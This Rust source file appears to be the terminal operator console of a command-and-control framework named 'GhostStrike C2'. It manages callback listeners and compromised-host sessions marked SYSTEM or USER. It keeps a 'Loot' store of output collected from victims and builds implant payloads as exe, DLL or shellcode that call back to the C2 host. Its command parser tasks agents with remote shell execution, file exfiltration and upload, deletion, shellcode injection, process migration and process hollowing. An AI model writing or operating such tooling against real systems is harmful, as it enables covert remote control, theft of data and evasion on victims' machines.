use std::collections::HashMap;
use tokio::sync::mpsc;
use uuid::Uuid;
use crossterm::event::KeyEvent;
use chrono::{DateTime, Utc};

use ghoststrike_common::{
    AgentInfo, ListenerConfig, ListenerProtocol, Task, OperatorMsg,
    BuildConfig, PayloadFormat,
};

#[derive(Debug)]
pub enum Event {
    Key(KeyEvent),
    Server(OperatorMsg),
    WsConnected(mpsc::Sender<OperatorMsg>),
    WsDisconnected,
    Quit,
}

#[derive(Debug, Clone, PartialEq)]
pub enum Tab {
    Dashboard,
    Listeners,
    Sessions,
    Interact,
    Build,
    Loot,
}

impl Tab {
    pub fn title(&self) -> &'static str {
        match self {
            Self::Dashboard => "Dashboard",
            Self::Listeners => "Listeners",
            Self::Sessions  => "Sessions",
            Self::Interact  => "Interact",
            Self::Build     => "Build",
            Self::Loot      => "Loot",
        }
    }

    pub fn icon(&self) -> &'static str {
        match self {
            Self::Dashboard => "◈",
            Self::Listeners => "◉",
            Self::Sessions  => "◎",
            Self::Interact  => "▶",
            Self::Build     => "⚙",
            Self::Loot      => "◆",
        }
    }

    pub fn all() -> &'static [Tab] {
        &[
            Tab::Dashboard, Tab::Listeners, Tab::Sessions,
            Tab::Interact,  Tab::Build,     Tab::Loot,
        ]
    }
}

#[derive(Debug, Clone, PartialEq)]
pub enum InputMode {
    Normal,
    Insert,
}

#[derive(Debug, Clone, PartialEq)]
pub enum PopupKind {
    AgentActions,
    NewListener,
    AgentInfo,
    Confirm { msg: String },
}

#[derive(Debug, Default, Clone)]
pub struct ListenerDraft {
    pub name:           String,
    pub protocol_index: usize,
    pub host:           String,
    pub port:           String,
    pub focused_field:  usize,
}

impl ListenerDraft {
    pub fn protocol(&self) -> ListenerProtocol {
        match self.protocol_index % 4 {
            0 => ListenerProtocol::Http,
            1 => ListenerProtocol::Https,
            2 => ListenerProtocol::Dns,
            _ => ListenerProtocol::Smb,
        }
    }
}

#[derive(Debug, Clone)]
pub struct LootEntry {
    pub timestamp: DateTime<Utc>,
    pub agent_id:  Uuid,
    pub hostname:  String,
    pub command:   String,
    pub output:    String,
}

pub struct App {
    pub tab:              Tab,
    pub agents:           HashMap<Uuid, AgentInfo>,
    pub listeners:        HashMap<Uuid, ListenerConfig>,
    pub tasks:            Vec<Task>,
    pub log:              Vec<(DateTime<Utc>, String)>,
    pub selected_agent:   Option<Uuid>,
    pub selected_listener: Option<Uuid>,
    pub console_input:    String,
    pub input_mode:       InputMode,
    pub build_config:     BuildConfigDraft,
    pub connected:        bool,
    pub server_name:      String,
    pub operators:        Vec<String>,
    pub build_log:        Vec<String>,
    pub loot:             Vec<LootEntry>,
    pub popup:            Option<PopupKind>,
    pub listener_draft:   ListenerDraft,
    pub task_history:     Vec<String>,
    pub history_pos:      Option<usize>,
    pub loot_scroll:      usize,
    pub log_scroll:       usize,
    event_tx:             mpsc::Sender<Event>,
    ws_tx:                Option<mpsc::Sender<OperatorMsg>>,
}

#[derive(Debug, Default, Clone)]
pub struct BuildConfigDraft {
    pub listener_index: usize,
    pub sleep_ms:       String,
    pub jitter_pct:     String,
    pub format_index:   usize,
    pub output_path:    String,
    pub focused_field:  usize,
}

impl App {
    pub fn new(event_tx: mpsc::Sender<Event>) -> Self {
        Self {
            tab:              Tab::Dashboard,
            agents:           HashMap::new(),
            listeners:        HashMap::new(),
            tasks:            Vec::new(),
            log:              Vec::new(),
            selected_agent:   None,
            selected_listener: None,
            console_input:    String::new(),
            input_mode:       InputMode::Normal,
            build_config:     BuildConfigDraft {
                sleep_ms:    "5000".into(),
                jitter_pct:  "10".into(),
                output_path: "./payload.exe".into(),
                ..Default::default()
            },
            connected:        false,
            server_name:      "GhostStrike C2".into(),
            operators:        Vec::new(),
            build_log:        Vec::new(),
            loot:             Vec::new(),
            popup:            None,
            listener_draft:   ListenerDraft {
                name: "http-80".into(),
                host: "0.0.0.0".into(),
                port: "8080".into(),
                ..Default::default()
            },
            task_history:     Vec::new(),
            history_pos:      None,
            loot_scroll:      0,
            log_scroll:       0,
            event_tx,
            ws_tx:            None,
        }
    }

    pub fn push_log(&mut self, msg: impl Into<String>) {
        if self.log.len() > 500 { self.log.remove(0); }
        self.log.push((Utc::now(), msg.into()));
    }

    pub async fn handle(&mut self, event: Event) {
        use crossterm::event::{KeyCode, KeyModifiers};

        match event {
            Event::WsConnected(tx) => {
                self.ws_tx     = Some(tx);
                self.connected = true;
            }
            Event::WsDisconnected => {
                self.ws_tx     = None;
                self.connected = false;
                self.push_log("[!] Disconnected — retrying…");
            }
            Event::Server(msg) => self.handle_server_msg(msg),
            Event::Key(key) => {
                // Popup intercepts all keys first
                if self.popup.is_some() {
                    self.handle_popup_key(key).await;
                    return;
                }
                if self.input_mode == InputMode::Insert {
                    match key.code {
                        KeyCode::Esc => {
                            self.input_mode = InputMode::Normal;
                            self.history_pos = None;
                        }
                        KeyCode::Enter => self.submit_input().await,
                        KeyCode::Up => self.history_prev(),
                        KeyCode::Down => self.history_next(),
                        KeyCode::Char(c) => {
                            if key.modifiers.contains(KeyModifiers::CONTROL) && c == 'c' {
                                self.input_mode = InputMode::Normal;
                            } else {
                                self.console_input.push(c);
                                self.history_pos = None;
                            }
                        }
                        KeyCode::Backspace => { self.console_input.pop(); }
                        _ => {}
                    }
                    return;
                }
                // Normal mode global keys
                match key.code {
                    KeyCode::Char('q') => { let _ = self.event_tx.send(Event::Quit).await; }
                    KeyCode::Char('1') => self.tab = Tab::Dashboard,
                    KeyCode::Char('2') => self.tab = Tab::Listeners,
                    KeyCode::Char('3') => self.tab = Tab::Sessions,
                    KeyCode::Char('4') => self.tab = Tab::Interact,
                    KeyCode::Char('5') => self.tab = Tab::Build,
                    KeyCode::Char('6') => self.tab = Tab::Loot,
                    KeyCode::Tab       => self.cycle_tab(false),
                    KeyCode::BackTab   => self.cycle_tab(true),
                    _ => self.handle_tab_key(key).await,
                }
            }
            Event::Quit => {}
        }
    }

    async fn handle_popup_key(&mut self, key: crossterm::event::KeyEvent) {
        use crossterm::event::KeyCode;
        match &self.popup.clone() {
            Some(PopupKind::AgentActions) => {
                match key.code {
                    KeyCode::Esc | KeyCode::Char('q') => self.popup = None,
                    KeyCode::Char('i') => {
                        self.popup = None;
                        self.tab   = Tab::Interact;
                        self.input_mode = InputMode::Insert;
                    }
                    KeyCode::Char('p') => {
                        self.popup = None;
                        self.tab   = Tab::Interact;
                        self.send_to_server(OperatorMsg::TaskAgent {
                            task: self.make_task(ghoststrike_common::TaskCommand::Ps),
                        }).await;
                    }
                    KeyCode::Char('w') => {
                        self.popup = None;
                        self.tab   = Tab::Interact;
                        self.send_to_server(OperatorMsg::TaskAgent {
                            task: self.make_task(ghoststrike_common::TaskCommand::Whoami),
                        }).await;
                    }
                    KeyCode::Char('k') => {
                        self.popup = Some(PopupKind::Confirm {
                            msg: "Kill agent? This cannot be undone.".into(),
                        });
                    }
                    _ => {}
                }
            }
            Some(PopupKind::NewListener) => {
                use crossterm::event::KeyCode;
                match key.code {
                    KeyCode::Esc => self.popup = None,
                    KeyCode::Enter => self.submit_new_listener().await,
                    KeyCode::Up => {
                        if self.listener_draft.focused_field > 0 {
                            self.listener_draft.focused_field -= 1;
                        }
                    }
                    KeyCode::Down => {
                        self.listener_draft.focused_field =
                            (self.listener_draft.focused_field + 1).min(3);
                    }
                    KeyCode::Left | KeyCode::Right => {
                        if self.listener_draft.focused_field == 1 {
                            if key.code == KeyCode::Left {
                                if self.listener_draft.protocol_index > 0 {
                                    self.listener_draft.protocol_index -= 1;
                                }
                            } else {
                                self.listener_draft.protocol_index =
                                    (self.listener_draft.protocol_index + 1) % 4;
                            }
                        }
                    }
                    KeyCode::Backspace => {
                        match self.listener_draft.focused_field {
                            0 => { self.listener_draft.name.pop(); }
                            2 => { self.listener_draft.host.pop(); }
                            3 => { self.listener_draft.port.pop(); }
                            _ => {}
                        }
                    }
                    KeyCode::Char(c) => {
                        match self.listener_draft.focused_field {
                            0 => self.listener_draft.name.push(c),
                            2 => self.listener_draft.host.push(c),
                            3 => self.listener_draft.port.push(c),
                            _ => {}
                        }
                    }
                    _ => {}
                }
            }
            Some(PopupKind::AgentInfo) => {
                self.popup = None;
            }
            Some(PopupKind::Confirm { .. }) => {
                match key.code {
                    crossterm::event::KeyCode::Char('y') | crossterm::event::KeyCode::Enter => {
                        if let Some(id) = self.selected_agent {
                            self.send_to_server(OperatorMsg::TaskAgent {
                                task: self.make_task(ghoststrike_common::TaskCommand::Exit),
                            }).await;
                            self.agents.remove(&id);
                        }
                        self.popup = None;
                    }
                    _ => { self.popup = None; }
                }
            }
            None => {}
        }
    }

    fn handle_server_msg(&mut self, msg: OperatorMsg) {
        match msg {
            OperatorMsg::AuthOk { server_name, .. } => {
                self.connected   = true;
                self.server_name = server_name;
                self.push_log("[*] Authenticated to server");
            }
            OperatorMsg::AuthFail { reason } => {
                self.push_log(format!("[!] Auth failed: {reason}"));
            }
            OperatorMsg::AgentCheckin { agent } => {
                let priv_str = if agent.elevated { "SYSTEM" } else { "USER" };
                self.push_log(format!(
                    "[+] New session: {} | {}\\{} | {} | {} | {}",
                    &agent.id.to_string()[..8],
                    agent.hostname, agent.username,
                    agent.os_version, agent.arch, priv_str
                ));
                self.agents.insert(agent.id, agent);
            }
            OperatorMsg::AgentList { agents } => {
                for a in agents { self.agents.insert(a.id, a); }
            }
            OperatorMsg::AgentRemoved { id } => {
                self.agents.remove(&id);
                self.push_log(format!("[-] Session removed: {}", &id.to_string()[..8]));
            }
            OperatorMsg::ListenerStarted { config } => {
                self.push_log(format!(
                    "[+] Listener '{}' ({}) on {}:{}",
                    config.name, config.protocol, config.host, config.port
                ));
                self.listeners.insert(config.id, config);
            }
            OperatorMsg::ListenerStopped { id } => {
                self.listeners.remove(&id);
                self.push_log(format!("[-] Listener {} stopped", &id.to_string()[..8]));
            }
            OperatorMsg::ListenerList { listeners } => {
                for l in listeners { self.listeners.insert(l.id, l); }
            }
            OperatorMsg::TaskResult { task } => {
                let output = task.output.clone().unwrap_or_default();
                // Store in loot
                if let Some(agent) = self.agents.get(&task.agent_id) {
                    self.loot.push(LootEntry {
                        timestamp: Utc::now(),
                        agent_id:  task.agent_id,
                        hostname:  agent.hostname.clone(),
                        command:   format!("{:?}", task.command),
                        output:    output.clone(),
                    });
                }
                self.push_log(format!(
                    "[>] {} ◂ {}",
                    &task.agent_id.to_string()[..8],
                    if output.len() > 80 { format!("{}…", &output[..80]) } else { output.clone() }
                ));
                self.tasks.push(task);
            }
            OperatorMsg::OperatorJoined { name } => {
                self.push_log(format!("[*] Operator joined: {name}"));
                if !self.operators.contains(&name) { self.operators.push(name); }
            }
            OperatorMsg::OperatorLeft { name } => {
                self.push_log(format!("[*] Operator left: {name}"));
                self.operators.retain(|n| n != &name);
            }
            OperatorMsg::BuildReady { build_id, bytes, format } => {
                self.build_log.push(format!(
                    "[+] {} ready: {} ({} bytes)",
                    format, &build_id[..8], bytes.len()
                ));
                self.push_log(format!("[+] Build complete: {}", &build_id[..8]));
            }
            OperatorMsg::BuildError { reason } => {
                self.build_log.push(format!("[!] Build failed: {reason}"));
                self.push_log(format!("[!] Build failed: {reason}"));
            }
            OperatorMsg::Error { message } => {
                self.push_log(format!("[!] {message}"));
            }
            _ => {}
        }
    }

    pub async fn send_to_server(&self, msg: OperatorMsg) {
        if let Some(ref tx) = self.ws_tx {
            let _ = tx.send(msg).await;
        }
    }

    async fn handle_tab_key(&mut self, key: crossterm::event::KeyEvent) {
        use crossterm::event::KeyCode;
        match &self.tab {
            Tab::Sessions => match key.code {
                KeyCode::Up    => self.select_prev_agent(),
                KeyCode::Down  => self.select_next_agent(),
                KeyCode::Enter => {
                    if self.selected_agent.is_some() {
                        self.popup = Some(PopupKind::AgentActions);
                    }
                }
                KeyCode::Char('i') => {
                    if self.selected_agent.is_some() {
                        self.tab = Tab::Interact;
                        self.input_mode = InputMode::Insert;
                    }
                }
                KeyCode::Char('I') => {
                    if self.selected_agent.is_some() {
                        self.popup = Some(PopupKind::AgentInfo);
                    }
                }
                KeyCode::Char('p') => {
                    if self.selected_agent.is_some() {
                        self.tab = Tab::Interact;
                        self.send_to_server(OperatorMsg::TaskAgent {
                            task: self.make_task(ghoststrike_common::TaskCommand::Ps),
                        }).await;
                    }
                }
                KeyCode::Char('w') => {
                    if self.selected_agent.is_some() {
                        self.tab = Tab::Interact;
                        self.send_to_server(OperatorMsg::TaskAgent {
                            task: self.make_task(ghoststrike_common::TaskCommand::Whoami),
                        }).await;
                    }
                }
                _ => {}
            }
            Tab::Listeners => match key.code {
                KeyCode::Up   => self.select_prev_listener(),
                KeyCode::Down => self.select_next_listener(),
                KeyCode::Char('n') => {
                    self.popup = Some(PopupKind::NewListener);
                }
                KeyCode::Char('d') | KeyCode::Delete => {
                    if let Some(id) = self.selected_listener {
                        self.send_to_server(OperatorMsg::StopListener { id }).await;
                    }
                }
                _ => {}
            }
            Tab::Interact => match key.code {
                KeyCode::Char('i') => self.input_mode = InputMode::Insert,
                KeyCode::PageUp => {
                    if self.log_scroll + 1 < self.log.len() {
                        self.log_scroll += 1;
                    }
                }
                KeyCode::PageDown => {
                    if self.log_scroll > 0 { self.log_scroll -= 1; }
                }
                _ => {}
            }
            Tab::Loot => match key.code {
                KeyCode::Up   => { if self.loot_scroll > 0 { self.loot_scroll -= 1; } }
                KeyCode::Down => {
                    if !self.loot.is_empty() && self.loot_scroll + 1 < self.loot.len() {
                        self.loot_scroll += 1;
                    }
                }
                _ => {}
            }
            Tab::Build => match key.code {
                KeyCode::Up   => { let bc = &mut self.build_config; if bc.focused_field > 0 { bc.focused_field -= 1; } }
                KeyCode::Down => { let bc = &mut self.build_config; bc.focused_field = (bc.focused_field + 1).min(4); }
                KeyCode::Left => {
                    let llen = self.listeners.len();
                    let bc   = &mut self.build_config;
                    match bc.focused_field {
                        0 => { if bc.listener_index > 0 { bc.listener_index -= 1; } }
                        3 => { if bc.format_index > 0 { bc.format_index -= 1; } }
                        _ => {}
                    }
                    let _ = llen;
                }
                KeyCode::Right => {
                    let llen = self.listeners.len();
                    let bc   = &mut self.build_config;
                    match bc.focused_field {
                        0 => { if llen > 0 { bc.listener_index = (bc.listener_index + 1) % llen; } }
                        3 => { bc.format_index = (bc.format_index + 1) % 3; }
                        _ => {}
                    }
                }
                KeyCode::Enter => self.trigger_build().await,
                KeyCode::Char('i') => {
                    self.input_mode = InputMode::Insert;
                }
                _ => {}
            }
            Tab::Dashboard => match key.code {
                KeyCode::PageUp => { if self.log_scroll + 1 < self.log.len() { self.log_scroll += 1; } }
                KeyCode::PageDown => { if self.log_scroll > 0 { self.log_scroll -= 1; } }
                _ => {}
            }
            _ => {}
        }
    }

    fn make_task(&self, command: ghoststrike_common::TaskCommand) -> Task {
        use ghoststrike_common::TaskStatus;
        Task {
            id:           Uuid::new_v4(),
            agent_id:     self.selected_agent.unwrap_or(Uuid::nil()),
            operator:     "operator".into(),
            command,
            status:       TaskStatus::Pending,
            output:       None,
            created_at:   Utc::now(),
            completed_at: None,
        }
    }

    async fn submit_new_listener(&mut self) {
        let d = &self.listener_draft;
        let port = d.port.parse::<u16>().unwrap_or(8080);
        let cfg  = ListenerConfig {
            id:         Uuid::new_v4(),
            name:       d.name.clone(),
            protocol:   d.protocol(),
            host:       d.host.clone(),
            port,
            active:     true,
            dns_domain: None,
            pipe_name:  None,
        };
        self.send_to_server(OperatorMsg::StartListener { config: cfg }).await;
        self.popup = None;
    }

    pub async fn trigger_build(&mut self) {
        let bc = &self.build_config;
        let listeners: Vec<&ListenerConfig> = self.listeners.values().collect();
        let listener = match listeners.get(bc.listener_index) {
            Some(l) => *l,
            None => {
                self.build_log.push("[!] No listener — start one first (Listeners tab → n)".into());
                return;
            }
        };
        let format = match bc.format_index % 3 {
            1 => PayloadFormat::Shellcode,
            2 => PayloadFormat::Dll,
            _ => PayloadFormat::Exe,
        };
        let cfg = BuildConfig {
            listener_id:   listener.id,
            c2_host:       listener.host.clone(),
            c2_port:       listener.port,
            protocol:      listener.protocol,
            sleep_ms:      bc.sleep_ms.parse().unwrap_or(5000),
            jitter_pct:    bc.jitter_pct.parse().unwrap_or(10),
            format,
            output_path:   Some(bc.output_path.clone()),
            dns_domain:    listener.dns_domain.clone(),
            pipe_name:     listener.pipe_name.clone(),
            c2_key:        String::new(),
            server_pubkey: String::new(),
        };
        self.build_log.push(format!(
            "[*] Generating {} → {} ({}:{})",
            cfg.format, bc.output_path, cfg.c2_host, cfg.c2_port
        ));
        self.send_to_server(OperatorMsg::BuildPayload { config: cfg }).await;
    }

    fn cycle_tab(&mut self, reverse: bool) {
        let tabs = Tab::all();
        let idx  = tabs.iter().position(|t| t == &self.tab).unwrap_or(0);
        let next = if reverse {
            (idx + tabs.len() - 1) % tabs.len()
        } else {
            (idx + 1) % tabs.len()
        };
        self.tab = tabs[next].clone();
    }

    fn select_next_agent(&mut self) {
        let ids: Vec<Uuid> = self.agents.keys().cloned().collect();
        if ids.is_empty() { return; }
        let idx = self.selected_agent
            .and_then(|id| ids.iter().position(|i| *i == id))
            .unwrap_or(0);
        self.selected_agent = Some(ids[(idx + 1) % ids.len()]);
    }

    fn select_prev_agent(&mut self) {
        let ids: Vec<Uuid> = self.agents.keys().cloned().collect();
        if ids.is_empty() { return; }
        let idx = self.selected_agent
            .and_then(|id| ids.iter().position(|i| *i == id))
            .unwrap_or(0);
        self.selected_agent = Some(ids[(idx + ids.len() - 1) % ids.len()]);
    }

    fn select_next_listener(&mut self) {
        let ids: Vec<Uuid> = self.listeners.keys().cloned().collect();
        if ids.is_empty() { return; }
        let idx = self.selected_listener
            .and_then(|id| ids.iter().position(|i| *i == id))
            .unwrap_or(0);
        self.selected_listener = Some(ids[(idx + 1) % ids.len()]);
    }

    fn select_prev_listener(&mut self) {
        let ids: Vec<Uuid> = self.listeners.keys().cloned().collect();
        if ids.is_empty() { return; }
        let idx = self.selected_listener
            .and_then(|id| ids.iter().position(|i| *i == id))
            .unwrap_or(0);
        self.selected_listener = Some(ids[(idx + ids.len() - 1) % ids.len()]);
    }

    fn history_prev(&mut self) {
        if self.task_history.is_empty() { return; }
        let pos = match self.history_pos {
            None      => self.task_history.len() - 1,
            Some(0)   => 0,
            Some(p)   => p - 1,
        };
        self.history_pos    = Some(pos);
        self.console_input  = self.task_history[pos].clone();
    }

    fn history_next(&mut self) {
        match self.history_pos {
            None => {}
            Some(p) if p + 1 >= self.task_history.len() => {
                self.history_pos   = None;
                self.console_input = String::new();
            }
            Some(p) => {
                self.history_pos   = Some(p + 1);
                self.console_input = self.task_history[p + 1].clone();
            }
        }
    }

    async fn submit_input(&mut self) {
        let input = self.console_input.trim().to_string();
        if input.is_empty() { return; }
        self.console_input.clear();
        self.input_mode  = InputMode::Normal;
        self.history_pos = None;

        // Push to history (avoid duplicates)
        if self.task_history.last().map(|s| s.as_str()) != Some(&input) {
            self.task_history.push(input.clone());
            if self.task_history.len() > 100 { self.task_history.remove(0); }
        }

        if let Some(agent_id) = self.selected_agent {
            match parse_command(&input) {
                Ok(command) => {
                    use ghoststrike_common::TaskStatus;
                    let task = Task {
                        id:           Uuid::new_v4(),
                        agent_id,
                        operator:     "operator".into(),
                        command,
                        status:       TaskStatus::Pending,
                        output:       None,
                        created_at:   Utc::now(),
                        completed_at: None,
                    };
                    self.push_log(format!("> {input}"));
                    self.send_to_server(OperatorMsg::TaskAgent { task }).await;
                }
                Err(e) => {
                    self.push_log(format!("[!] {e}"));
                }
            }
        } else {
            self.push_log("[!] No session selected — go to Sessions tab (3), select, Enter");
        }
    }
}

fn parse_command(input: &str) -> Result<ghoststrike_common::TaskCommand, String> {
    use ghoststrike_common::TaskCommand;
    let mut parts = shell_split(input);
    if parts.is_empty() { return Err("empty".into()); }
    let cmd = parts.remove(0).to_lowercase();
    match cmd.as_str() {
        "shell" | "cmd" | "exec" | "run" => {
            if parts.is_empty() { return Err("usage: shell <cmd>".into()); }
            Ok(TaskCommand::Shell { cmd: parts.join(" ") })
        }
        "pwd"    => Ok(TaskCommand::Pwd),
        "whoami" => Ok(TaskCommand::Whoami),
        "ps"     => Ok(TaskCommand::Ps),
        "exit" | "kill" => Ok(TaskCommand::Exit),
        "ls" | "dir" => {
            Ok(TaskCommand::Ls { path: parts.into_iter().next().unwrap_or_else(|| ".".into()) })
        }
        "cd" => Ok(TaskCommand::Cd {
            path: parts.into_iter().next().ok_or("usage: cd <path>")?
        }),
        "cat" | "type" => Ok(TaskCommand::Cat {
            path: parts.into_iter().next().ok_or("usage: cat <path>")?
        }),
        "rm" | "del" => Ok(TaskCommand::Rm {
            path: parts.into_iter().next().ok_or("usage: rm <path>")?
        }),
        "mkdir" => Ok(TaskCommand::Mk {
            path: parts.into_iter().next().ok_or("usage: mkdir <path>")?
        }),
        "download" | "dl" => Ok(TaskCommand::Download {
            path: parts.into_iter().next().ok_or("usage: download <path>")?
        }),
        "upload" | "ul" => {
            if parts.len() < 2 { return Err("usage: upload <local> <remote>".into()); }
            let data = std::fs::read(&parts[0])
                .map_err(|e| format!("cannot read {}: {e}", parts[0]))?;
            Ok(TaskCommand::Upload { path: parts[1].clone(), data })
        }
        "sleep" => {
            let ms     = parts.first().and_then(|s| s.parse::<u64>().ok()).ok_or("usage: sleep <ms>")?;
            let jitter = parts.get(1).and_then(|s| s.parse::<u8>().ok()).unwrap_or(10);
            Ok(TaskCommand::Sleep { ms, jitter })
        }
        "inject" => {
            if parts.len() < 2 { return Err("usage: inject <pid> <shellcode_hex>".into()); }
            let pid      = parts[0].parse::<u32>().map_err(|_| "pid must be a number")?;
            let shellcode = hex::decode(&parts[1]).map_err(|_| "shellcode must be hex")?;
            Ok(TaskCommand::Inject { pid, shellcode })
        }
        "migrate" => Ok(TaskCommand::Migrate {
            pid: parts.first().and_then(|s| s.parse().ok()).ok_or("usage: migrate <pid>")?
        }),
        "hollow" => Ok(TaskCommand::Hollow {
            target_path: parts.into_iter().next().ok_or("usage: hollow <path>")?
        }),
        _ => Ok(TaskCommand::Shell { cmd: input.to_string() }),
    }
}

fn shell_split(s: &str) -> Vec<String> {
    let mut tokens = Vec::new();
    let mut current = String::new();
    let mut in_quotes = false;
    for ch in s.chars() {
        match ch {
            '"'                    => in_quotes = !in_quotes,
            ' ' | '\t' if !in_quotes => {
                if !current.is_empty() { tokens.push(std::mem::take(&mut current)); }
            }
            _ => current.push(ch),
        }
    }
    if !current.is_empty() { tokens.push(current); }
    tokens
}
